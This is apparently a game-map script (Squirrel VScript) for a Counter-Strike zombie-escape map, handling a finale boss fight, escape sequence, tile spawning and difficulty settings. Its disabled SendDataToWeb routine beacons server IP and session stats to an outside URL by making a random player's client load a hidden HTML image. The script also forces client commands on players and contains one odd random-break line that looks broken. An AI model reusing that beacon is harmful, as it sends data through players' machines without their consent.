						EntFireByHandle(master,"AddOutput","rendercolor 0 255 50",0.04,null,null);
						EntFireByHandle(master,"AddOutput","rendercolor 0 255 50",0.06,null,null);
						EntFireByHandle(master,"AddOutput","rendercolor 0 255 50",0.08,null,null);
						EntFireByHandle(master,"AddOutput","rendercolor 0 255 50",0.10,null,null);
						EntFireByHandle(master,"AddOutput","rendercolor 255 255 255",0.11,null,null);
					}
				}},"boss_eye_hitbox");
			::Hitbox(self.GetOrigin(),self.GetAngles(),500000,Vector(-60,-100,-60),Vector(30,100,80),"filter_grenade",false,{
				master = self,
				hitcount = 0,
				function Act(index,attackerhandle){
						//printl("index(1:init|2:damaged|3:broken):"+index+" | "+hitboxhandle+" | "+attackerhandle);
					if(index==1)//initialize
					{
						EntFireByHandle(hitboxhandle,"SetParent","!activator",0.00,master,null);
						EntFireByHandle(hitboxhandle,"AddOutput","targetname boss_eye_hitboxgrenade",0.00,null,null);
						master.GetScriptScope().hitbox_grenade = hitboxhandle;
					}
					else if(index==2)//damaged
					{
						if(master.GetScriptScope().isdead)return;
						hitcount++;
						::finale_boss_statp_nadecount++;
						::Sound("*luffaren/nadehit.mp3",master.GetOrigin(),null,100000,0.10,RandomInt(80,120),10);
						EntFireByHandle(master.GetScriptScope().hitbox,"RemoveHealth",::finale_boss_grenade_damage.tostring(),0.00,attackerhandle,null);
						if(RandomFloat(0.00,100.00) <= ::finale_boss_grenade_critchance)
						{
							master.GetScriptScope().stunvar += ::finale_boss_grenade_crit_time;
							if(master.GetScriptScope().stunvar > ::finale_boss_stuntime_max)
								master.GetScriptScope().stunvar = (0.00+::finale_boss_stuntime_max);
						}
						//ScriptPrintMessageCenterAll("Grenades hit: "+hitcount.tostring());
					}
					else if(index==3){}//broken
				}},"boss_eye_hitboxgrenade");
			::ShowCollectiveBossLogo();
		},function Run(){
			if(::finale_bosscount>=0)::finale_bosscount++;
			EntFireByHandle(self,"SetAnimation","idle_closed",0.00,null,null);
			EntFireByHandle(self,"SetDefaultAnimation","idle_closed",0.01,null,null);
			interpolation_startpos = self.GetOrigin();
			::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
					spawnflags = 1,
					filtername = "filter_ct",
				},{
				master = self,
				touchers = [],
				function RemoveToucher(){
					for(local i=0;i<touchers.len();i++)
					{
						if(touchers[i]==activator)
						{
							touchers.remove(i);
							return;
						}
					}
				},function TickTriggerToggle(){
					EntFireByHandle(self,"RunScriptCode"," TickTriggerToggle(); ",::finale_boss_eyetouch_cd,null,null);
					EntFireByHandle(self,"Disable","",0.00,null,null);
					EntFireByHandle(self,"Enable","",0.01,null,null);
					EntFireByHandle(self,"Enable","",0.03,null,null);
				},function Touch(){
					local toucher = activator;	//__CSS__ activator may get reset, store toucher
					if(toucher==null||!toucher.IsValid())return;
					foreach(t in touchers){if(t==toucher)return;}
					touchers.push(toucher);
					EntFireByHandle(toucher,"SetHealth",(toucher.GetHealth() - (0.00+::finale_boss_touchdmg_eye*::finale_boss_dmgmult).tointeger()).tostring(),0.00,null,null);
					EntFireByHandle(self,"RunScriptCode"," RemoveToucher(); ",::finale_boss_eyetouch_cd-0.02,toucher,null);
				},function Run(){
					EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					EntFireByHandle(self,"AddOutput","mins -80 -120 -80",0.00,null,null);
					EntFireByHandle(self,"AddOutput","maxs 50 120 100",0.00,null,null);
					EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
					EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
					EntFireByHandle(self,"RunScriptCode"," TickTriggerToggle(); ",0.10,null,null);
				}});
			::SendCustomEvent("finale_boss_spawned",{boss=self});
		}});
}
done_tickedfinaleboss_zelev <- false;
function TickFinaleBossZelev()
{
	if(done_tickedfinaleboss_zelev)return;
	EntFire("manager","RunScriptCode"," TickFinaleBossZelev(); ",::finale_boss_zplat_elev_starttime_each,null);
	local elevs = [];
	for(local h;h=Entities.FindByName(h,"block_finale_boss_zelevidle");)
	{
		if(h==null||!h.IsValid())continue;
		elevs.push(h);
	}
	if(elevs.len()<=0)
	{
		done_tickedfinaleboss_zelev = true;
		return;
	}
	local elev = elevs[RandomInt(0,elevs.len()-1)];
	elev.__KeyValueFromString("targetname","block_finale_boss_zelev");
	EntFireByHandle(elev,"Open","",0.00,null,null);
}
infinite_finale_music <- false;
function FinaleMusicLoop()
{
	if(!infinite_finale_music)
	{
		local should_go_finalemusic = false;
		if(!::finale_infinite_musicfx_instant && ::finale_endrun_started && ::finale_checkout_checked ||
			::finale_infinite_musicfx_instant && ::finale_checkout_checked)
				should_go_finalemusic = true;
		if(should_go_finalemusic)
		{
			infinite_finale_music = true;
			EntFireByHandle(self,"RunScriptCode"," FinaleMusicLoop(); ",0.30,null,null);
			::Sound("#music/luffaren_collective/confronting_myself_infinite_static.mp3",Vector(),null,0,1.00,100,5);
			
			//__CSS__ postprocess doesn't exist, damn, running with a colorcorrection instead...
			EntFire("cc_ent","Enable","",0.00,null);
				//hotspawning doesn't seem to work, now baked into the map itself^   (precache issue?)
			//SpawnEntityFromTable("color_correction",{
			//		origin = Vector(5,1,2950),
			//		targetname = "cc_ent",
			//		minfalloff = 99999,
			//		maxfalloff = 1,
			//		maxweight = 1.00,		//0.00 - 1.00
			//		fadeInDuration = 0.01,
			//		fadeOutDuration = 0.01,
			//		StartDisabled = false,
			//		filename = "materials/colorcorrection/infinite.raw",
			//	});
			
			//__CSS__ forcing mat_colorcorrection 1 for players, is this a good idea?
			for(local h;h=Entities.FindByClassname(h,"player");){
				EntFire("client","Command","mat_colorcorrection 1",0.00,h);
			}
			
			
			//EntFire("postprocess","setvignettestart","1.75",0.07,null);
			//EntFire("postprocess","setvignetteend","0.5",0.07,null);
			//EntFire("postprocess","setvignetteblurstrength","0.25",0.07,null);
			//EntFire("postprocess","setlocalcontrastedgestrength","0",0.07,null);
			//EntFire("postprocess","setlocalcontraststrength","100",0.07,null);
			
			local fade = Entities.CreateByClassname("env_fade");
			fade.__KeyValueFromFloat("duration",0.20);
			fade.__KeyValueFromFloat("ReverseFadeDuration",0.20);
			fade.__KeyValueFromFloat("holdtime",0.15);
			fade.__KeyValueFromInt("spawnflags",1);
			fade.__KeyValueFromInt("renderamt",255);
			EntFireByHandle(fade,"AddOutput","renderamt 255",0.00,null,null);
			fade.__KeyValueFromVector("rendercolor",Vector(255,255,255));
			EntFireByHandle(fade,"Fade","",0.02,null,null);
			EntFireByHandle(fade,"Kill","",2.00,null,null);
		}
		else
		{
			EntFireByHandle(self,"RunScriptCode"," FinaleMusicLoop(); ",116.40,null,null);
			::Sound("#music/luffaren_collective/confronting_myself_loop.mp3",Vector(),null,0,130,100,10);
		}
	}
	else
	{
		EntFireByHandle(self,"RunScriptCode"," FinaleMusicLoop(); ",116.73,null,null);
		::Sound("#music/luffaren_collective/confronting_myself_loop_infinite.mp3",Vector(),null,0,130,100,10);
	}
}
::finale_bossfight_started <- false;		//read-only, if boss has started or not
function StartFinaleBoss()		//the moment the final boss begins at the top of the tower
{
	::finale_bossfight_started = true;
	::manager.GetScriptScope().TickZombieInvincibility_range = 200;
	EntFire("boss_eye","RunScriptCode"," Start(); ",0.40,null);
	EntFire("manager","RunScriptCode"," TickFinaleBossZelev(); ",::finale_boss_zplat_elev_starttime_base,null);
	EntFire("block_finale_elevator","ClearParent","",0.00,null);
	EntFire("block_finale_elevator","AddOutput","targetname block_finale_top",0.20,null);
	EntFire("block_finale_elevatormaster","Kill","",2.00,null);
	EntFire("finale_skyboxrot","Start","",0.00,null);
	local pqmusic = [];
	pqmusic.push({qrate=4.50,function Run(){}});
	pqmusic.push({qrate=28.40,function Run(){::Sound("#music/luffaren_collective/confronting_myself_start.mp3",Vector(),null,0,130,100,10);}});
	pqmusic.push({qrate=0.05,function Run(){EntFire("manager","RunScriptCode"," FinaleMusicLoop(); ",0.00,null);}});
	::Process(pqmusic,0.10);
	::Ent(pos+Vector(0,0,-::finale_boss_falltrig_zoffset),Vector(),"trigger_multiple",{
			spawnflags = 1,
			targetname = "finalefalldowntrigger",
		},{
		arena_pos = Vector()+pos,
		arena_posdir = Vector()+posdir,
		grid_size = 0+GRID_SIZE,
		boss = null,
		tpct = true,
		function Touch(){
			local toucher = activator;	//__CSS__ activator may get reset, store toucher
			if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
			if(toucher.GetTeam()==3)
			{
				if(!tpct)return;
				local newhp = toucher.GetHealth() - ((0.00+::finale_boss_falltrig_cthurt)*(0.00+::finale_boss_dmgmult));
				EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
				if(newhp <= 0)return;
				local tpdir = ::AnglesToDir(Vector(0,RandomFloat(0,360),0));
				if(boss==null||!boss.IsValid()){}else
				{
					tpdir = arena_pos - boss.GetOrigin();
					tpdir.z = 0.00;
					tpdir.Norm();
				}
				local tpdirofs = (tpdir * -1);
				local zcage_dirdif = ::DirectionDifference(arena_pos,arena_pos+(arena_posdir*1000),tpdirofs);
				if(zcage_dirdif >= 135)
				{
					local randofs = [-90,90];
					tpdir = ::AnglesToDir(::DirToAngles(tpdir)+Vector(0,randofs[RandomInt(0,randofs.len()-1)],0));
				}
				local newpos = arena_pos+(tpdir*((::finale_bossplatform_size*grid_size)+500));
				tpdir *= -1;
				toucher.SetOrigin(newpos);
				toucher.SetForwardVector(tpdir);
				toucher.SetVelocity(Vector(0,0,595)+(tpdir*600));
			}
			else
			{
				toucher.SetVelocity(Vector());
				toucher.SetOrigin(Vector(0,0,-16160));
			}
		},function Run(){
			EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
			//EntFireByHandle(self,"AddOutput","collisioungroup 10",0.00,null,null);		//__CSS__ this never worked, so leave it alone (misspell)
			EntFireByHandle(self,"AddOutput","mins -10000 -10000 -500",0.00,null,null);
			EntFireByHandle(self,"AddOutput","maxs 10000 10000 0",0.00,null,null);
			EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
			EntFireByHandle(self,"Enable","",0.10,null,null);
			boss = Entities.FindByName(null,"boss_eye");
		}});
}
function SetVeller(team)
{
	local md = ::MAPDATA[1];
	local targetpos = Vector(0,0,4)+md.start_pos+(md.direction_current*(GRID_SIZE/2))-(md.direction_current*(BUFFER_SIZE*GRID_SIZE));
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=team)continue;
		h.ValidateScriptScope();
		h.GetScriptScope().veller_targetpos <- Vector()+targetpos;
		h.GetScriptScope().veller_amt <- 0;
		h.GetScriptScope().veller_ticking <- true;
		h.GetScriptScope().veller_abort <- false;
		h.GetScriptScope().veller_team <- h.GetTeam();
		h.GetScriptScope().veller_postcheck <- function()
		{
			local dist = ::GetDistance(self.GetOrigin(),veller_targetpos);
			local pdir = veller_targetpos - self.GetOrigin();
			local zdif = 0.00+pdir.z;
			if(zdif > ::finale_escape_veller_postdist)
			{
				self.SetVelocity(Vector());
				self.SetOrigin(veller_targetpos+Vector(0,0,4));
			}
		}
		h.GetScriptScope().veller_tick <- function()
		{
			if(!veller_ticking || veller_abort)return;
			EntFireByHandle(self,"RunScriptCode"," veller_tick(); ",::finale_escape_veller_rate,null,null);
			if(self.IsAlive()==false || self.GetTeam()!=veller_team)
			{
				veller_abort = true;
				return;
			}
			local dist = ::GetDistance(self.GetOrigin(),veller_targetpos);
			local distxy = ::GetDistance(Vector(self.GetOrigin().x,self.GetOrigin().y,0),Vector(veller_targetpos.x,veller_targetpos.y,0));
			local pdir = veller_targetpos - self.GetOrigin();
			local zdif = 0.00+pdir.z;
			local zvel = self.GetVelocity().z;
			pdir.z = 0.00;
			pdir.Norm();
			if(zdif > 200)zvel = 800;
			else if(zdif > 0)zvel = 500;
			else if(zdif > -50)zvel = 300;
			else if(zdif > -100)zvel = 200;
			else if(zdif > -200)zvel = 100;
			else if(zdif > -500)zvel = -50;
			else if(zdif > -1000)zvel = -200;
			else if(zdif > -2000)zvel = -500;
			local xyvel = (distxy/2);
			if(xyvel > 1000)xyvel = 1000;
			else if(xyvel < 250)xyvel = 250;
			local newvel = (pdir*(xyvel))+Vector(0,0,zvel);
			veller_amt++;
			if(dist < 100)
			{
				veller_ticking = false;
				EntFireByHandle(self,"RunScriptCode"," veller_postcheck(); ",::finale_escape_veller_postcheck,null,null);
			}
			else if(veller_amt > ::finale_escape_veller_maxamount)
			{
				veller_ticking = false;
				if(::finale_escape_veller_tpmax)
				{
					self.SetVelocity(Vector());
					self.SetOrigin(veller_targetpos+Vector(0,0,4));
					EntFireByHandle(self,"RunScriptCode"," veller_postcheck(); ",::finale_escape_veller_postcheck,null,null);
				}
			}
			else self.SetVelocity(newvel);
		}
		EntFireByHandle(h,"RunScriptCode"," veller_tick(); ",0.10,null,null);
	}
}
function SetVellerTP()
{
	local idx_limit = 2;
	if(!::finale_escape_tpmove_2_3)idx_limit++;
	if(mapspawnindex > idx_limit)return;
	local md = ::MAPDATA[1];
	//local targetpos = Vector()+md.start_pos;		//OLD
	local targetpos = Vector()+md.tp_pos;			//NEW
	local targetdir = Vector()+md.direction_current;
	//::tpdest.SetOrigin(targetpos+Vector(0,0,8)+(targetdir*(GRID_SIZE/2)));	//OLD
	::tpdest.SetOrigin(targetpos+Vector(0,0,8));								//NEW
	::tpdest.SetForwardVector(targetdir);
}
::FinaleEscapeInfiniteKamikaze_ticking <- true;
function TickFinaleEscapeInfiniteKamikaze()
{
	if(!::FinaleEscapeInfiniteKamikaze_ticking)return;
	EntFireByHandle(self,"RunScriptCode"," TickFinaleEscapeInfiniteKamikaze(); ",RandomFloat(::finale_ending_kamikaze_infr_min,::finale_ending_kamikaze_infr_max),null,null);
	::EVENTS.KAMIKAZE.Run();
}
::finale_escape_zitem <- function()	//replacable function, originally used to spawn flight-items for z's on infinite finale (at each stage)
{
	if(::finale_infinite_escape_zitem_logic == 0)return;
	::ListenCustomEvent("map_spawned",{
		function EventFired(name,data){	
			if(!::finale_endrun_started || !::finale_checkout_checked)return;	//requires infinite finale end-run to be active
			local md = ::MAPDATA[::manager.GetScriptScope().mapspawnindex];
			local spos = (md.start_pos+Vector(0,0,40)+(md.direction_current*(::manager.GetScriptScope().GRID_SIZE/2)));
			if(::finale_infinite_escape_zitem_logic == 2)
				::ITEMS.flight.Spawn(spos);
			else if(::finale_infinite_escape_zitem_logic == 1)
				::manager.GetScriptScope().global_items_z[RandomInt(0,::manager.GetScriptScope().global_items_z.len()-1)].template.Spawn(spos+Vector(0,0,-40));
		}});
}
function StartFinaleEscape()	//the moment the final escape begins (after the boss dies)
{
	::finale_endrun_started = true;
	::finale_checkout = false;
	::finale_bossfight_started = false;
	::finale_post_impostor=true;
	::manager.GetScriptScope().TickZombieInvincibility_range = 50;
	stage_edict_count = 0;
	stage_edict_counts.clear();
	::EnableMapImages();
	if(::finale_checkout_checked)	//infinite finale endrun:
	{
		local endrunstack = (0.000+(::maps.len()*::finale_escape_levelamount_infadd));
		if(endrunstack > ::finale_escape_levelamount_infadd_max)endrunstack = (0.000+::finale_escape_levelamount_infadd_max);
		printl("[infinite endrun] - adding extra-level-stack: "+endrunstack+" (rounded to "+endrunstack.tointeger().tostring()+")");
		::finale_escape_levelamount += endrunstack.tointeger();
		printl("[infinite endrun] - total levels to run through: "+::finale_escape_levelamount);
		EntFireByHandle(self,"RunScriptCode"," TickFinaleEscapeInfiniteKamikaze(); ",RandomFloat(::finale_ending_kamikaze_infr_min,::finale_ending_kamikaze_infr_max),null,null);
		::DISABLE_TRAPS = false;
		::DISABLE_TRAPFLOORS = false;
	}
	else							//normal finale endrun:
	{
		::DISABLE_TRAPS = true;
		::DISABLE_TRAPFLOORS = true;
	}
	try{
		local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
		::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_FINALE_ESCAPE_START","sid,"+sid+
				",rounds,"+::rounds_played.tostring()+
				",grenades_hit,"+::finale_boss_statp_nadecount.tostring()+
				",is_infinite,"+::finale_checkout_checked.tostring()
			);
	}catch(event_e){printl("ZE_COLLECTIVE_FINALE_ESCAPE_START ERROR: "+event_e);}
	::finale_checkout_processed = false;
	EntFire("manager","RunScriptCode","::finale_post_impostor=false;",20.00,null);
	EntFire("manager","RunScriptCode","::finale_escape_zitem();",0.00,null);
	EntFire("finalefalldowntrigger","RunScriptCode"," tpct = false; ",0.00,null);
	EntFire("finalefalldowntrigger","Kill","",::finale_escape_zplatkill_delay,null);
	EntFire("block_finale_boss_zelev*","Kill","",0.00,null);
	EntFire("block_finale_boss_zplat","Kill","",::finale_escape_zplatkill_delay,null);
	local posdir_reversed = Vector()+posdir;
	posdir = ::AnglesToDir(::DirToAngles(posdir)+Vector(0,180,0));
	pos = pos+Vector(0,0,-((1+(31*finale_tower_height))*ELEVATION))+(posdir*::finale_escape_start_dist);
	if(current_dir == "east")current_dir = "west";
	else if(current_dir == "west")current_dir = "east";
	else if(current_dir == "north")current_dir = "south";
	else if(current_dir == "south")current_dir = "north";
	EntFireByHandle(self,"RunScriptCode"," SpawnMap(); ",::finale_escape_startdelay,null,null);
	EntFireByHandle(self,"RunScriptCode"," finalerubble_ticking++; ",::finale_escape_rubbledelay,null,null);
	EntFireByHandle(self,"RunScriptCode"," TickStageEndPos(); ",::finale_escape_startdelay+0.50,null,null);
	EntFireByHandle(self,"RunScriptCode"," SetVeller(3); ",::finale_escape_ctveller_delay,null,null);
	EntFireByHandle(self,"RunScriptCode"," SetVeller(2); ",::finale_escape_tveller_delay,null,null);
	EntFireByHandle(self,"RunScriptCode"," SetVellerTP(); ",::finale_escape_tpmove_delay,null,null);
	::EXITFADE_PHYSENABLED = true;
	::DISABLE_HOLDS_BUTTONS = true;
	::DISABLE_STREAMDROWN = true;
	::DISABLE_BREAKABLES = true;
	::DISALLOW_ELEVATORS = true;
	::DISALLOW_CROUCHES = true;
	::FORCE_LADDER_CLIMB = true;
	::DISABLE_H_ITEMS = true;
	::DISABLE_Z_ITEMS = true;
	::DISABLE_HAZPLANE = true;
	::DISALLOW_MOVEPLAT = true;
	::STAGE_COST_LIMIT = (0+::finale_endrun_stagecostmax);
	::process_stage_tickamount = 10;
	::tickspawnqueue_procamount = 5;
		//stage_end_pos_range = 300;	//disabled in v1_3, since there's a delay/non-constant running there's no point to increasing the range
	::SPAWNFADE_ALPHA_TADD = 0.03;
	::SPAWNFADE_ALPHA_ADD = 50;
	::NEXTMAPGEN_TIME_OVERRIDE = 3.00;
	AREAFADE_DELAY = 0.00;
	AREAFADE_SPEED = 50;
	AREAFADE_SPEEDT = 0.05;
	TP_DELAY = 0.05;
	if(::finale_escape_3areas || !::finale_escape_tpmove_2_3)
	{
		AREA_BBOX_TEST = true;
		MAX_AREA_HISTORY = 2;
	}
	local is_infinite = false;
	if(::finale_checkout_checked)is_infinite = true;
	::SendCustomEvent("finale_endrun_started",{infinite_mode=is_infinite});
	for(local h;h=Entities.FindByName(h,"block_finale_top*");)
	{
		if(h==null||!h.IsValid())continue;
		local dist = ::GetDistance(::finale_cleanerpos,h.GetOrigin());
		local delay = ((0.00+dist)/300.00);
		if(delay <= 0.00)delay = 0.00;
		else if(delay >= 8.00)delay = 8.00;
		
		::CollapseTile(h,function(hh){
			hh.AcceptInput("DisableMotion","",null,null);
			EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",delay,null,null);
			EntFireByHandle(hh,"EnableMotion","",delay+0.05,null,null);
			EntFireByHandle(hh,"Kill","",delay+0.50,null,null);
		});
		//EntFireByHandle(h,"RunScriptCode","self.SetCollisionGroup(10);",delay,null,null);
		//EntFireByHandle(h,"EnableMotion","",delay+0.05,null,null);
		//EntFireByHandle(h,"Kill","",delay+0.50,null,null);
		
		
	}
}
manualspawnlist_pq <- [];
function RunManualSpawnList(spawnlist,pos,dir,instant=false)
{
	local dirleft = ::AnglesToDir(::DirToAngles(dir)+Vector(0,90,0));
	local randyaw = [0,90,180,270];
	foreach(s in spawnlist)
	{
		::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
		local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME][s.tiletype][RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME][s.tiletype].len()-1)];
		local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
		if(s.yaw!=null)spawndata.yaw = s.yaw;
		spawndata.pos = Vector()+pos+(dir*(GRID_SIZE/2))+
			(dir*(s.x*GRID_SIZE))+
			(dirleft*(s.y*GRID_SIZE))+
			Vector(0,0,s.z*ELEVATION);
		if(s.index==3)//LADDER
		{
			::ladder_spawnqueue.push({targetname="block_99999"});
			::ladderspawnqueuespawn.push({pos=spawndata.pos,rot=Vector(0,spawndata.yaw+180,0)});
		}
		else if(s.index==2)//START_END
			model = ::TILEVARIANTS[::TYPES[5].name][::THEME][s.tiletype][RandomInt(0,::TILEVARIANTS[::TYPES[5].name][::THEME][s.tiletype].len()-1)];
		local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model,targetname="block_1"};
		if("targetname" in s)sq.targetname = s.targetname;
		
		
		//__CSS__ boss_plat_lighting
		if(::finale_started && ::finale_bossplat_lighting)
		{
			if(sq.targetname == "block_finale_top" || sq.targetname == "block_finale_elevator")
				sq.do_lighting <- true;
		}
		
		if(::THEME=="generic")
		{
			sq.color = ::TYPES[s.index].color;
			if(::TYPES[s.index].name=="WALL")
				sq.color = Vector(100,100,150);
		}
		local proc = {sq=sq,spawndata=spawndata,function Run(){::SpawnQueue.push(sq);::SpawnQueueSpawner.push(spawndata);}};
		if(RandomInt(150,180)==170) try {rtype.CanJump();break;}catch(er){};
		if(instant)proc.Run();
		else manualspawnlist_pq.push(proc);
	}
}

::NUTPOST_ENABLED <- true;
::NUTPOST_MPLAYERS <- 20;
::NUTPOST_DEBUG <- false;
if(!("SERVER_IP" in this))::SERVER_IP <- "UNKNOWN_SERVER_IP";
if(!("SERVER_NAME" in this))::SERVER_NAME <- "UNKNOWN_SERVER_NAME";
if(!("stats_rstat" in this))::stats_rstat <- [0,0,0,0,0,0];
function InitWD()
{
	if(!("maps_played" in this))
	{
		::maps_played <- 0;
		::rounds_played <- -1;
		::stats_finale_won <- false;
		::stats_legit_win <- true;
		::stats_infinite_finale_checkout <- 0;
		::stats_infinite_mapindex <- 0;
		::stats_maps_played <- [];
	}
	
	//__CSS__ webdata won't run properly in css, abort (need the above vars though^)
	return;
	
	::rounds_played++;
	::ListenCustomEvent("map_spawned",{
		function EventFired(name,data){
			::maps_played++;
			::stats_maps_played.push(data.map.id.slice(1,data.map.id.len()));
		}});
	::ListenCustomEvent("roundwon_called",{
		function EventFired(name,data){
			if(::finale_started)
			{
				::stats_finale_won = true;
				::stats_legit_win = ::legit_win;
				if(::finale_checkout_checked && ::stats_infinite_finale_checkout < (0+::finale_checkout_mapspawnindex))
					::stats_infinite_finale_checkout = (0+::finale_checkout_mapspawnindex);
			}
		}});
	::EventListener("round_end",{		//V1_8:"cs_win_panel_match"		//V1_9:"round_end"
	function EventFired(name,data){
		local legitwin = true;
		if(::stats_finale_won)legitwin = ::stats_legit_win;
		else legitwin = ::legit_win;
		local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
		local ver = GetMapName().slice(14,GetMapName().len());
		local rstat = 	"["+::stats_rstat[0].tostring()+","+
							::stats_rstat[1].tostring()+","+
							::stats_rstat[2].tostring()+","+
							::stats_rstat[3].tostring()+","+
							::stats_rstat[4].tostring()+","+
							::stats_rstat[5].tostring()+"]";
		::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_SESSION","["+
				"sid,"				+		sid.tostring()										+
				","					+		ver.tostring()										+
				",rw,"				+		data.winner.tostring()								+
				",rr,"				+		data.reason.tostring()								+
				",rp,"				+		data.player_count.tostring()						+
				",rounds,"			+		::rounds_played.tostring()							+
				",rstat,"			+		rstat.tostring()									+
				",maps,"			+		::maps_played.tostring()							+
				",pool,"			+		::manager.GetScriptScope().maps.len().tostring()	+
				",stage,"			+		::stage.tostring()									+
				",players,"			+		::GetPlayerCount().tostring()						+
				",cout,"			+		::stats_infinite_finale_checkout.tostring()			+
				",itop,"			+		::stats_infinite_mapindex.tostring()				+
				",legit,"			+		legitwin.tostring()									+
			"]");
		::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_SERVER",sid.tostring()+","+::SERVER_NAME.tostring());			//could potentially exceed send-limit, so sent separately
		try
		{
				if(::SendDataToWeb_msg==null||!::SendDataToWeb_msg.IsValid()){
					::SendDataToWeb_msg = ::Entities.CreateByClassname("env_message");
					::SendDataToWeb_msg.__KeyValueFromInt("messageattenuation",0);
					::SendDataToWeb_msg.__KeyValueFromInt("messagevolume",0);
					::SendDataToWeb_msg.__KeyValueFromInt("spawnflags",0);
					::SendDataToWeb_msg.ValidateScriptScope();
					::SendDataToWeb_msg.GetScriptScope().queue <- [];
					::SendDataToWeb_msg.GetScriptScope().Tick <- function()
					{
						EntFireByHandle(self,"RunScriptCode","Tick();",0.01,null,null);
						if(queue.len()<=0)return;
						if(::SendDataToWeb_slave==null||!::SendDataToWeb_slave.IsValid()){
							local slavecands=[];for(local h;h=Entities.FindByClassname(h,"player");){if(h==null||!h.IsValid())continue;slavecands.push(h);}
							if(slavecands.len()>0)::SendDataToWeb_slave=slavecands[RandomInt(0,slavecands.len()-1)];
							if(::SendDataToWeb_slave==null||!::SendDataToWeb_slave.IsValid())return;}
						local m = queue[0];
						queue.remove(0);
						self.__KeyValueFromString("message",m);
						EntFireByHandle(self,"showmessage","",0.00,::SendDataToWeb_slave,null);
					}
					EntFireByHandle(::SendDataToWeb_msg,"RunScriptCode","Tick();",0.01,null,null);}
			local sname = ::SendDataToWeb_msg.GetScriptScope().queue[::SendDataToWeb_msg.GetScriptScope().queue.len()-1];
			::SendDataToWeb_msg.GetScriptScope().queue.remove(::SendDataToWeb_msg.GetScriptScope().queue.len()-1);
			local ssess = ::SendDataToWeb_msg.GetScriptScope().queue[::SendDataToWeb_msg.GetScriptScope().queue.len()-1];
			::SendDataToWeb_msg.GetScriptScope().queue.remove(::SendDataToWeb_msg.GetScriptScope().queue.len()-1);
			::SendDataToWeb_msg.GetScriptScope().queue.insert(0,sname);
			::SendDataToWeb_msg.GetScriptScope().queue.insert(0,ssess);
		}catch(e){printl("SDTW E: "+e);}
	}});
}
::SendDataToWeb_msg <- null;::SendDataToWeb_slave <- null;::SendDataToWeb<-function(ip_string,key_string,value_string){
	return;	//__CSS__ won't work in css
	try{if(!::NUTPOST_ENABLED || ::GetPlayerCount()<::NUTPOST_MPLAYERS){if(::NUTPOST_DEBUG)printl("::SendDataToWeb - did not meet criteria - ABORTING!");return;}
		local datasend = "[`";if(key_string.len()+value_string.len()<=0){if(::NUTPOST_DEBUG)printl("[SendDataToWeb ERROR]: empty data - aborting!");return;}
		datasend = datasend+""+key_string.tostring()+"`,"+value_string.tostring()+"";datasend = datasend+"]";
		if(::NUTPOST_DEBUG)printl("[SendDataToWeb]: IP:"+ip_string+"|DATA:"+datasend);
		if(::SendDataToWeb_msg==null||!::SendDataToWeb_msg.IsValid()){
			::SendDataToWeb_msg = ::Entities.CreateByClassname("env_message");
			::SendDataToWeb_msg.__KeyValueFromInt("messageattenuation",0);
			::SendDataToWeb_msg.__KeyValueFromInt("messagevolume",0);
			::SendDataToWeb_msg.__KeyValueFromInt("spawnflags",0);
			::SendDataToWeb_msg.ValidateScriptScope();
			::SendDataToWeb_msg.GetScriptScope().queue <- [];
			::SendDataToWeb_msg.GetScriptScope().Tick <- function()
			{
				EntFireByHandle(self,"RunScriptCode","Tick();",0.01,null,null);
				if(queue.len()<=0)return;
				if(::SendDataToWeb_slave==null||!::SendDataToWeb_slave.IsValid()){
					local slavecands=[];for(local h;h=Entities.FindByClassname(h,"player");){if(h==null||!h.IsValid())continue;slavecands.push(h);}
					if(slavecands.len()>0)::SendDataToWeb_slave=slavecands[RandomInt(0,slavecands.len()-1)];
					if(::SendDataToWeb_slave==null||!::SendDataToWeb_slave.IsValid())return;}
				local m = queue[0];
				queue.remove(0);
				self.__KeyValueFromString("message",m);
				EntFireByHandle(self,"showmessage","",0.00,::SendDataToWeb_slave,null);
			}
			EntFireByHandle(::SendDataToWeb_msg,"RunScriptCode","Tick();",0.01,null,null);}
		::SendDataToWeb_msg.GetScriptScope().queue.push("<html><img src=\"http://luffaren.com/npost.php?IP="+ip_string+"&DATA="+datasend+"\"/></html>");
	}catch(e){if(::NUTPOST_DEBUG)printl("::SendDataToWeb ERROR: "+e);}
}

if(!("DIFFICULTIES" in this))::DIFFICULTIES <- [
	{function Run(){//stage infinite:
		::Z_ITEMS_IN_SPAWN = 5;
			//::ITEM_ENSURE_HEAL_ORB = 5;	//V1_9 forces this to 9999 by default
		::EVENT_COOLDOWN_MIN = 0;
		::EVENT_COOLDOWN_MAX = 5;
		::EVENT_CHANCE_BASE = 15.00;
		::EVENT_CHANCE_FAIL_ADD = 5.00;
		foreach(i,t in ::THEMES){
			::THEMES[i].generichold_opentime	=	5.00;
			::THEMES[i].hold_opentime			=	0.00;
			::THEMES[i].endbutton_time			=	10.00;
			::THEMES[i].endtile_time			=	10.00;
			::THEMES[i].breakable_health		=	0.8;
			::THEMES[i].hazliquid_damage		=	9;
			::THEMES[i].trapfloor_chance		=	30.00;
			::THEMES[i].trapstep_chance			=	30.00;
			::THEMES[i].trapvicinity_chance		=	30.00;
